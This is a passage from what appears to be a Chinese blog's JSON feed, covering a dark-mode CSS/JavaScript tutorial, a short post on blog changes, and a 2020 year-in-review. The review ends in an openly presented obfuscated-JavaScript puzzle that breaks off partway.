CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ 